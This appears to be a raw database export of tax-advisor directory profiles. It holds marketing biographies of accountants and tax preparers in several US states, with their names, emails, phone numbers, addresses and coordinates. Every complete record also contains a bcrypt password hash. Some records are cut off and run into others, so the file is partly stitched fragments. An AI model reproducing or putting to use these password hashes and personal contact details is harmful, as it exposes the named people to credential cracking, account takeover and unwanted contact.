"<p id=""isPasted"">Since 2011, we have been providing financial services to individuals and companies. As a business, we focus primarily on tax preparation and bookkeeping for individuals, small businesses, and small nonprofits; we also offer ongoing consulting services. Bookkeeping and tax returns can be very scary for some people, and we believe in bridging the gap and empowering our clients to take over their books (if that is something they want to do). For clients who are new to business or accounting, we recommend and set up accounting software, train them how to use QuickBooks Online, and create templates and instructional pdfs.&nbsp;</p><p>For long-term bookkeeping clients, we offer monthly, quarterly, or annual bookkeeping services.&nbsp;</p><p>Tax and accounting laws can be confusing and are continually changing. You are busy running a business or having a life or have no desire to stay current on new regulations and legislation. That is where we come in; by keeping current on tax laws and legislation, we are in a position to identify key tax planning opportunities that reduce or eliminate both your current and future tax liabilities. We provide our clients with the expertise and knowledge that they deserve throughout the year.</p><p>If you enjoy preparing your tax returns but want that final person to review them, we offer that as well. Alternatively, maybe, you are working with a new preparer, and they are unable to answer your questions or provide the advice you need or want. We can be that second set of eyes that will help review your tax return line by line and offer suggestions.</p><p>We offer a complimentary consultation phone call so we can see what needs you have and get to know you and/or your business better.</p>",2,,,"ACH/Credit cards",,,,"San Francisco","Mickele Nowden CPA",US,"United States",,"California CPA",,,mickele@mickelenowdencpa.com,2011,https://www.facebook.com/MickeleNowdenCPA,,0,california/san-francisco/tax-services/mickele-nowden-cpa,Mickele,https://advisors.taxdome.com/california/san-francisco/tax-services/mickele-nowden-cpa,0,,,,https://www.instagram.com/no_ordinary_cpa/,20221114091831,Nowden,37.7749295,https://www.linkedin.com/company/mickelenowdencpa,Company,,-122.4194155,"2022-11-14 12:18:25",0,,$2a$11$8baa487f3cd57700986eauPPtForMy7EDCUdQ0rBmU5L6xDCZsqtO,5106891845,,Owner/Operator,"Tax Services",https://advisors.taxdome.com/pictures/profile/pimage-285-431-photo.jpg,,,"Mon 6 am - 1 pm PST (or 9 am - 4 pm EST/ 2 pm - 9 pm GMT)Tues 6 am - 1 pm PST (or 9 am - 4 pm EST/ 2 pm - 9 pm GMT)Thurs 6 am - 1 pm PST (or 9 am - 4 pm EST/ 2 pm - 9 pm GMT)Fri 6 am - 1 pm PST (or 9 am - 4 pm EST/ 2 pm - 9 pm GMT)","Since 2011 we have been providing tax preparation and bookkeeping services so our clients can focus on what is important to them.",,,20221114091824,CA,California,1,9bd76560c12d5574f86bdbbf4f979c2f,0,0,0,,,285,0,http://www.mickelenowdencpa.com/,,https://youtube.com/@no_ordinary_cpa,

"<p>I am a Certified Tax Representation Consultant and I have an Enrolled Agent designation. This means I am federally authorized to represent tax payers from all 50 states before the IRS. I hold two accounting degrees and I also have vast experience with individual and business tax returns. Having seen good, hard working people fall into tax problems, it was a natural transition for me to start representing them before the IRS by providing tax relief options and audit representation. Unlike the large tax firms, I oversee each case from the beginning to end, with utmost attention, respect, and confidentiality. I protect my clients&rsquo; assets and communicate with the IRS, so my clients don&rsquo;t have to.&nbsp;</p><p>Having an accounting degree, uniquely positions me to see opportunities and potential issues that others may not be able to see.</p><p>I am also a member of DOPE CFO VIP Network. We provide world class accounting and tax services to cannabis businesses. As a result of our experience, we have developed processes and protocols that specifically address the needs of the cannabis industry. Our goal is to provide peace of mind to our clients by ensuring that their financial affairs are in order. In addition, we work closely with our clients to help them navigate the complex regulatory landscape. We are proud to be the go-to resource for cannabis businesses across the country.</p>",2,"127 Oak Promenade Ct","127 Oak Promenade Ct","Credit cards, checks, ACH bank transfers",,,https://aristos.tax/blog/,Davenport,"Aristos Consulting, LLC",US,"United States",,"Enrolled Agent (EA), Certified Tax Resolution Consultant;",,,jbiegaj@outlook.com,2019,https://www.facebook.com/aristos.tax,,0,florida/davenport/tax-services/aristos-consulting-llc,Jola,https://advisors.taxdome.com/florida/davenport/tax-services/aristos-consulting-llc,0,,,ChIJz-19bY153YgRKt2S2L-14aI,,20221021142950,Biegaj,28.25097,https://www.linkedin.com/in/jolabiegaj/,Company,,-81.57483069999999,"2022-10-21 17:28:06",0,,$2a$11$8baa487f3cd57700986eaunP7sgFdZfaXlno.y77OThiyDRVEJ44i,3212784345,,CEO,"Tax Services",https://advisors.taxdome.com/pictures/profile/pimage-228-39-photo.png,,,"Tuesday - Saturday 12 noon - 9pm","Tax Resolution Expert | Cannabis Accounting Specialist | DOPE CFO VIP Network |",,,20221021142806,FL,Florida,1,a8fcf21a6975f309293a5e1d6ed39e0e,0,0,0,,,228,0,https://www.aristos.tax,,,33896

"<p>Genesis Business Solutions, Inc and Simply Books Now LLC are both managed and owned by Paula Rhoden. Located in Deland, Florida Paula is an expert in all areas of accounting, bookkeeping, payroll, and business services. Both firms serve clients nationwide.</p><p id=""isPasted"">&#39;CREATIVE, HELPFUL, and ACCURATE&#39; is what clients say about Paula and her companies. Located in Central Florida since 2003, services are 100% REMOTE, 100% OF THE TIME. &nbsp;Paula builds her team to stay on top of the latest technology to bring opportunities that help enterprises grow, sustain, and build a legacy. We offer a boutique-style service so that we are better equipped to serve clients more fully.</p><p>CORPORATE STRATEGY AND SETUP: We understand that each business has unique needs. We create a custom structure accounting, document management, and storage solution to fit your business (company registration,&nbsp;payroll, sales tax and more). As an added benefit, we are available to answer your questions and help with your ongoing and changing business needs.</p><p>TAX PREP: Our firm specializes in small business tax preparation, 1065, 1120S and 1120, and schedule C.&nbsp;</p><p>BOOKKEEPING: With a team of seasoned accountants, we work closely to ensure your bookkeeping is managed, so you are worry-free. Each month our team will have your books reconciled and up to date, payroll and sales taxes are filed and paid, and reports ready for your review.</p><p>We have developed a unique system that makes it quick and easy to file your taxes.

We provide the same level of service online that you would receive sitting in our office, and we utilize the most secure methods in transmitting your private information.</p><p>In 1988 Paula started building her wealth of knowledge by creating a new venture, an accounting service providing temp contractors to auto dealership&#39;s back office. She knew everything about the back office for auto dealerships from a/r, a/p license, and titling new and used car purchases, budgeting, R.O&#39;s, P.O&#39;s, the works. She hit it big with that business model because it was a unique niche with a great need for a service temp style. It was so successful that she couldn&rsquo;t keep up with it. It wasn&#39;t long before my business model morphed from a one-person show going into clients&#39; office to working with clients from many different industries. This was great because now she could work from home and service more clients in the same amount of time.&nbsp;</p><p>Soon after, Paula began preparing tax returns for her clients. The business grew all by word-of-mouth. Growing a virtual accounting business didn&#39;t happen overnight. I worked with local CPA&#39;s filling holes they had in servicing their clients. After several years of doing this, my knowledge and client base grew vastly. &nbsp;</p><p>In 2002 Paula relocated to Central Florida from the Chicagoland area and managed five employees in a growing business. Her firm serviced clients from government agencies to lawn care businesses, retail to wholesale, and professionals such as doctors and lawyers. Yes, Paula began building her knowledge in the classroom, but it was a real-life experience that brought her the wisdom needed to succeed. In this ever-changing world, it can be challenging to find the time to stay informed, whether it be in technology, law, or trends.&nbsp;</p><p>If you want someone to care as much (or more) than you do about your business finances, then don&#39;t wait another minute. Pick up your phone and contact us, phone, text, or email, and let us join your team. We want to come along-side you to help make your business and your life a successful journey.</p><p>&nbsp;</p>",2,"142 Saddlebrook Way",,"Check, Credit/Debit Cards",,,,DELAND,"GENESIS BUSINESS SOLUTIONS INC",US,,,"Annual File Season Preparer registered with the IRS, Quickbooks Pro-Advisor since 1995",,,PAULA@GENESISACCOUNTING.TAX,1990,https://www.facebook.com/paula.rhoden.543,,0,deland/tax-services/genesis-business-solutions-inc,PAULA,https://advisors.taxdome.com/deland/tax-services/genesis-business-solutions-inc,0,,,,,20221020104845,RHODEN,,https://www.linkedin.com/in/paula-rhoden-76773b244/,Company,,,"2022-10-20 13:48:42",0,,$2a$11$8baa487f3cd57700986eau/BT9Dvpu6QMk6QgCE/k1bedoY9BPnrO,4078109155,,President,"Tax Services",https://advisors.taxdome.com/pictures/profile/pimage-143-37-photo.jpg,"""We rise by lifting others""  -Robert Ingersoll",,"9am - 4pm","As a small business accounting and tax professional with over 30 years of service, Paula's firm is a one-stop-shop, equipped and staffed to help small business owners",,,20221020104842,,,1,175b6f7db718440770c3de565f9fbf22,0,0,0,,,143,0,https://www.simplybooksnow.com,,,32724

"<p id=""isPasted"">Mariet Ostos, born in Caracas, Venezuela, immigrated to Atlanta, Georgia, at the age of 19 with $1,000 and a kid on the way in 2000, when her nation was in upheaval. To survive in Georgia, she originally lived on the streets and cleaned houses, bathrooms, and offices. She was then transferred to a domestic violence shelter and gave birth to her daughter, Mary Ann Ostos. She left the shelter after six months and relocated to Florida to pursue her ambition of starting her own business.</p><p>Ostos studied accounting to become a professional tax counselor and began assisting residents and small businesses in her area in 2006. She did not, however, achieve quick success since she had to knock on doors in her community to explain herself and the services she provided. Ostos is now a successful businesswoman who was named Entrepreneur of the Year by the Society of Emotional Intelligence for her community involvement.</p><p>Success Business&nbsp;Solution, Inc</p><p>Success Business Solution&nbsp;is a corporation committed to assisting small businesses and individuals who wish to start or already run a business. We assist customers in better organizing and managing their funds, as well as receiving the finest tax guidance.</p><p>Dreaming&nbsp;for&nbsp;Getting Better</p><p>With the conditions in which Ostos country was, she had to decide for the future of her daughter. She shares,&nbsp;&ldquo;I had to solve the problem quickly, so I decided to move to another country,&nbsp;alone.&nbsp;I had visited Atlanta, Georgia before, but when I was put in the position of choosing, I knew this was where I wanted to live.&rdquo;&nbsp;She further adds, &ldquo;I moved in with a thousand dollars in my pocket and a bundle full of&nbsp;dreams.&nbsp;I lived in a shelter for 6 months. The lady in charge offered me a place to live in exchange for work because I had no legal documents at the time to work. That was the first time someone gave me a chance, and it gave me hope and determination to move on. I lived there for 6 months until I realized I had to get out and start my own journey. I started by cleaning houses, bathrooms, and offices. No matter what I did, I never lost focus on my&nbsp;goals&nbsp;of having my own business. I never stopped dreaming. Giving up was never an option.&ldquo;</p><p>After years of studying tax law, Mariet took the initial step and opened her own tax preparation agency in Atlanta in May 2007. In 2009, she was contracted to do a market analysis for the state of Florida; Orlando was a rapidly rising metropolis, and Mariet didn&rsquo;t hesitate to relocate and thrive in this new location. She relocated to Orlando in 2010, eager to contribute to a new community and improve her experiences. She had to start from the ground up, knock on doors, explain my services, and spread her name.</p><p>After around 5 years, she observed that some individuals began to come to her office for counsel and assistance. Mariet made the decision to make a difference and have an influence on the people in her life. She got her Personal Coaching license in 2014, followed by an Emotional Intelligence degree, and was then motivated to join the John Maxwell team. This was a means for Mariet to gain the information she required to teach leadership and set her standards; she learnt how to provide tools to help people live better and stress-free lives.</p><p>Later in 2016, she decided to start leadership and motivational classes to influence her community.</p><p>Recognition for Excellence</p><p>Mariet was named Entrepreneur of the Year by the Emotional Intelligence Society in 2015. From early 2016 to early 2021, she was awarded the best tax preparation office award by the top businesses in Orlando. Receiving these honors has boosted my motivation to serve others. In 2021, Mariet was named one of the Success 125 most influential people for making long-lasting, positive changes in people&rsquo;s lives. It&rsquo;s the best feeling in the world to see the people she loves and cares about achieve their goals and give them the optimism they need to continue forward.</p><p>Advice for Emerging Leaders</p><p>Mariet refers to herself as a Latino Tax Pro and is a member of an organization of Latino tax professionals that believes in providing ethical and moral service to their clients. Her advice to young leaders is to trust in themselves, to devote as much time as possible to studying, to support one another, and to be disciplined. &ldquo;Discipline is the key to success,&rdquo; she explains.</p><p>Mariet believes that the first step in starting a business is to do something that you enjoy, to learn as much as you can, and to invest in yourself. She adds that she will continue to invest in education for herself and her team, as well as in community service and dreaming.</p><p>https://successpitchers.com/most-successful-business-women-to-watch-in-2022-august22/</p>",2,"11183 S Orange Blossom Trl","Ste G",CashCheckACH,"Success 125 Most Influential leader 2022",,,Orlando,"Success Business Solution, Inc",US,"United States",,"RTRPAFSPRealtorAccredited Investor",forms/139-cv-1668883086.jpeg,https://advisors.taxdome.com/uploads/forms/139-cv-1668883086.jpeg,mariet@successorlando.com,2013,https://www.facebook.com/successorlando,,0,florida/orlando/tax-services/success-business-solution-inc,Mariet,https://advisors.taxdome.com/florida/orlando/tax-services/success-business-solution-inc,0,,,,https://www.instagram.com/successorlando,20221119081223,Ostos,28.4039065,https://www.linkedin.com/in/MarietOstos,Company,,-81.40407239999999,"2022-10-20 13:45:24",0,,$2a$11$8baa487f3cd57700986eauFsdJPuiDTu7LhpVoRf7MRk7mRP3L82y,4077454684,,President,"Tax Services",https://advisors.taxdome.com/pictures/profile/pimage-139-105-photo.jpg,"No soy Negociable!",,"Monday to Friday 9am to 5pmTax season hours:Monday to Friday 9am to 6pmSaturdays 9am to 1pm","My name is Mariet Ostos I have been in business for the past 18 years assisting and helping business owners and small business to organized their finances.",,,20221020104524,FL,Florida,1,5901fd64b7d658e2028406faf99961e7,0,0,0,,,139,0,https://www.successorlando.com,,,32837

"<p id=""isPasted""><strong>We specialize in working with small business.</strong></p><p>Life as a small business owner can be very difficult and trying at times. But as much as you know this as a small business owner, you also know that it can be incredibly flexible and rewarding, too! As a small business ourselves, we know what it&rsquo;s like. Let&rsquo;s be honest, sometimes you are wearing ALL of the hats! And as great as that can be when you first start, it can also be exhausting! At some point, you know that you need to hand those hats off to someone else&hellip;someone you can trust. And that&rsquo;s where we come in.<br><br>The hats we wear are specifically designed to take so much stress off of you, and help you sleep better at night. Stop worrying about whether you are paying your team enough, or if they are feeling satisfied with their work. Stop wondering if you&rsquo;re going to be able to make payroll for the next go-around. Stop thinking about if your business will survive the 50% failure rate of most small businesses.&nbsp;<br><br>Just stop.<br>Breath.<br><br>We&rsquo;ve got this. We&rsquo;ll take all of these hats off your plate: HR, Payroll, Bookkeeper, and CFO. If it has to do with people or money, we&rsquo;ve got you covered! We&rsquo;ll handle it all and give you a super-simplified set of step-by-step instructions on what you need to do to grow your business&hellip;because that&rsquo;s all you should be focusing on!<br><br>Stop wasting your time with the day-to-day and start focusing on the thing that actually makes you money. And rest easy knowing that we have everything else covered.<br><br>Don&rsquo;t waste another minute.</p><p><br></p><p><strong>About Me</strong><br><br>My name is Kimberly Ferguson, and I&rsquo;ll be your CFO and Tax Reduction Specialists! All of my life, I have had a great love of people. Working at another bookkeeping firm opened my eyes to the way that most accountants treated small business owners.&nbsp;And that just didn&rsquo;t work for me! That&rsquo;s why I started Emerald Expectations Accounting with my husband, Jeremy.</p><p>We had a vision: An accounting firm that treats its clients like family &ndash; with unquestionable integrity, incomparable professionalism and the most exceptional customer care anyone could find in the market. As a business owner myself, I am most excited by BIG impacts! I want to make a difference in your business and in your life. I do this by helping you grow your business&rsquo; profits &amp; cash flow, all while decreasing your overall tax liability.</p><p><br><br><strong>About Emerald</strong></p><p id=""isPasted"">When you invest in working with Emerald Expectations Accounting, we give you something of tremendous value &ndash;&nbsp;Time &ndash; something you can never get back once it&rsquo;s lost. So, instead of doing your bookkeeping, payroll, taxes, etc., spend more time with your family and friends and doing the revenue-generating tasks you enjoy! Leave the rest to us!</p><p>When you outsource to us, not only are you saving time, and making more money, but you are also&nbsp;saving money! If you hire an in-house&nbsp;bookkeeper, you&rsquo;ll be paying for time not worked (such as breaks), company meetings, training, etc. You&rsquo;ll also be paying for benefits such as 401ks, insurance, vacation, and sick leave. You&rsquo;ll need space in your office, additional equipment such as computers, desks and chairs, and more office supplies like paper and ink. Don&rsquo;t forget the extra insurance and taxes you&rsquo;ll need to pay for your employee, such as Workers Comp Insurance, Social Security, Medicare Matching, and State/Federal Unemployment Tax! Not to mention the potential risk that an employee can be to your business! Our partners&nbsp;SAVE MONEY&nbsp;working with us!</p><p>We&nbsp;Respect&nbsp;our partners!

"<p id=""isPasted"">HBS is all about &quot;Reaching Beyond Numbers!&quot; We make a habit to instill the mantra to our clients, &quot;don&#39;t fixate on the money.&quot; On this professional career and entrepreneurial journey, we have come across so many individuals and businesses who have their minds set on making money. Now, it is not wrong to have a desire to make and have money. However, the problem that we have seen is many chase the dollar and wonder why they cannot seem to attain and increase their income. They cannot seem to grasp an understanding of what is really wrong. What is the root cause? It&#39;s the processes!&nbsp;</p><p>What stands out most about what we do is when people have that &quot;ah ha&quot; moment. To see the light bulb come on and the smiles on their faces, makes us feel so overjoyed! It does nothing but solidify that we are doing exactly what we have been purposed to do in life.</p><p>As the CEO, I consider myself to be different and not the &quot;typical&quot; bean counter, executive or consultant. I like to have fun in every thing that I do, including my business. I grew up as an Army brat and we moved quite frequently. So my life was always about meeting new people and being able to adapt, improvise, and overcome.&nbsp;</p><p>I truly believe in forging relationships with each person and business I work with. When we begin to talk about dreams, businesses, money, and the ups and downs of it all, things become intimate and personal. And the best way I am able to connect to others is by truly taking the time to listen to what is being shared, and simply be me, which includes honesty, transparency, and authenticity.</p><p>Outside of my professional endeavors, I enjoy spending time reading and being in the kitchen. Yes, I love to cook and I am great at it! For me, it is relaxing and therapeutic. Additionally, I am a wife to Shawn, a mother to a precious girl, Riley; a darling son, Kori; and have the best fur-kid ever, Arwen Brooke! She is a toy yorkipoo, full of energy and personality. They all keep me filled with joy and laughter!&nbsp;</p><p>Thank you for taking time to read this and learning a bit about who we are. We look forward to meeting and learning more about you!</p><p>Blessings,</p><p>Myranda&nbsp;</p>",2,,,"ACH, Credit/Debit Card",,,,Raleigh,"Harper Business Solutions",US,"United States",,"Advanced Certified Nonprofit Accounting Professional (CNAP), AFSP,",forms/86-cv-1665767245.pdf,https://advisors.taxdome.com/uploads/forms/86-cv-1665767245.pdf,mjh@reachingbeyondnumbers.com,2012,https://www.facebook.com/HarperBusinessSolutions/,,0,north-carolina/raleigh/tax-services/harper-business-solutions,Myranda,https://advisors.taxdome.com/north-carolina/raleigh/tax-services/harper-business-solutions,0,,,,https://www.instagram.com/harperbusinesssolutions/,20221014095347,Harper-Penn,35.6631125,https://www.linkedin.com/company/harperbusinesssolutions,Company,,-78.6795836,"2022-10-14 12:53:43",0,,$2a$11$8baa487f3cd57700986eauNbQuCkdRlWVRz6Iy87x3.mmYqzKCYV6,919-928-1168,,"Founder & CEO","Tax Services",https://advisors.taxdome.com/pictures/profile/pimage-86-410-photo.png,"HBS is all about ""Reaching Beyond Numbers!""

"<hr><p style=""margin-left: 20px;"">We&#39;ve been expecting you! We are different from most tax firms out there, as most prepare your taxes, get you in and out, and see you next year. We service our clients holistically and have a focus on communication and education. Instead, we focus on tax planning as this is what actually helps save you money on taxes and devising strategies to meet your tax goals.</p><p style=""margin-left: 20px;"">Many of the clients that we serve today have left their prior CPA because they weren&rsquo;t helping them save and were not available to take care of them because they were focused on quantity and not quality. We are not a tax firm for everyone and are only a good fit for those who want to step their tax games up by being invested in their taxes to save, are hands-off, and allow us to do our jobs.</p><p style=""margin-left: 20px; text-align: center; line-height: 1;"">Get ready for ☟</p><p><img src=""https://advisors.taxdome.com/images/member_uploads/member_6a6f7058857ed77432862a85463d51c1/7ca0769aeb384e87d56afcdf3ce37be314f7f2a5.png"" style=""width: 750px;"" class=""fr-fic fr-dib"" loading=""lazy""></p><p><img src=""https://advisors.taxdome.com/images/member_uploads/member_6a6f7058857ed77432862a85463d51c1/e47ce3e633ce33b927c03561dbe8e18ffd00c495.png"" style=""width: 743px;"" class=""fr-fic fr-dib"" loading=""lazy""></p><hr><p style=""text-align: center;"">Everyone&rsquo;s tax situation is different, use our online calculator to build the quote for your needs&nbsp;</p><p style=""text-align: center;""><a href=""https://thecpadude.com/customize-your-own-quote/"" title="""">✎ Build your quote! &nbsp;</a></p><p style=""text-align: center;"">☟Reach out to us and start your savings journal !&nbsp;</p><p style=""text-align: center;"">☏&nbsp;(510)-439-0186</p><p style=""text-align: center;"">✉ <a href=""mailto:info@thecpadude.com"">info@thecpadude.com</a></p><p id=""isPasted"" style=""text-align: center;""><em>&quot;Even Albert Einstein reportedly needed help on his 1040 form&quot; &nbsp;</em>Don&#39;t miss out our educational content ! &nbsp;<a href=""https://www.tiktok.com/@thecpadude"" title=""The CPA DUDE ""><img src=""https://advisors.taxdome.com/images/member_uploads/member_6a6f7058857ed77432862a85463d51c1/90533b3290c99bda79371ab50d9139ee5dde9c85.png"" style=""width: 549px;"" class=""fr-fic fr-dib"" loading=""lazy""></a></p><p><br></p>",2,"3346 Park Ridge Drive",,"E check / ACH",,,https://thecpadude.com,Richmond,"The CPA Dude",US,,,CPA,,,tony@thecpadude.com,2019,https://www.facebook.com/TheCPADude,,0,richmond/tax-services/the-cpa-dude,Tony,https://advisors.taxdome.com/richmond/tax-services/the-cpa-dude,0,,,,https://www.instagram.com/thecpadude_/,20221117103348,Hoong,,https://www.linkedin.com/company/thecpadude/,Company,,,"2022-10-04 00:32:18",0,,$2a$11$8baa487f3cd57700986eauzWpkNVc0LosC7y9yJ6CYNSBTk/W11nK,510-439-0186,,Owner,"Tax Services",https://advisors.taxdome.com/pictures/profile/pimage-70-496-photo.jpeg,,,"Monday – Sunday: 24/7 ONLINE – 8:00 AM to 10:00 PM PST","Tax strategist that helps you with tax planning in order to get all the write offs you can and to pay the least amount of taxes possible!",,"Accounting,Audit,Bookkeeping,Business Consulting,Financial Planning,Fractional CFO,Payroll Services,Tax Planning,Tax Preparation",20221003213218,,,1,6a6f7058857ed77432862a85463d51c1,0,0,0,https://twitter.com/thecpadude_,,70,0,https://thecpadude.com,,https://www.youtube.com/channel/UCYGpuEieef0OYIpsx2fAfwQ,94806

That&#39;s where our story begins, way back in 1979. Fast forward a few decades and our humble tax preparation operation have grown to serve clients in all 50 states and even some foreign countries.&nbsp;</p><p>But despite our growth, one thing has remained constant: our commitment to YOU.&nbsp;</p><p>We understand that everyone&#39;s financial situation is unique, and that&#39;s why we don&#39;t just focus on how much money you make, but rather how much money you get to keep. After all, there are only four things you can do with your money: save it, spend it, pay taxes with it, or give it away. And the amount of money allocated to one option directly impacts the amount available for the others. That&#39;s why we offer our knowledge and experience in providing tax advice to custom-tailor a holistic approach. We work together to lower your tax liability and ensure that you&#39;re keeping as much of your money as possible. But our services don&#39;t stop at tax preparation. We also shift our focus to tax planning. Tax preparation is all about putting the best spin on what has already happened, but tax planning is about creating and implementing legal and ethical strategies to reduce the amount of tax you pay in the years to come.&nbsp;</p><p>So whether you need tax planning and preparation or personal financial planning, we&#39;ll help you create strategies that allow you to keep more of your money.

"<p id=""isPasted"">Maybe accounting and business finance aren&#39;t rocket science, but Deirdre actually was a rocket scientist! As a child, Deirdre wanted to go to the moon; she was fascinated with space and space exploration. Having lived out her dreams (perhaps not going to the moon - but becoming and working as a NASA Engineer was living out a dream), it&#39;s not a stretch to see how she is now helping others live out their dreams of entrepreneurship.</p><p>Deirdre Morhet, founder of BASC Expertise, has developed a sharp eye for how businesses get bloated with inefficiencies, specifically when it comes to cash flow and taxes, and how they can retool into a sleeker, smoother, strategically focused organization. As an entrepreneur who quickly built her own successful business, she helps other business owners set priorities and understand the importance of the financial aspect of their business so they can continue to grow. &quot;Houston, WE HAVE A PROBLEM!&quot;... and Deirdre is always there to make what seems impossible possible.</p><p>Her clients have ranged from real-life Astronauts and large construction/manufacturing corporations to Mom-and-Pop retail shops. She has been featured on Arizona News Channel 3, has earned numerous awards for best accounting firm, and was honored with the Sun Devil 100 Entrepreneurial award in 2017, 2018, and 2022.</p><p>Deirdre&#39;s expertise includes business financial analysis, tax preparation &amp; planning, business organization, entity structure, and more.
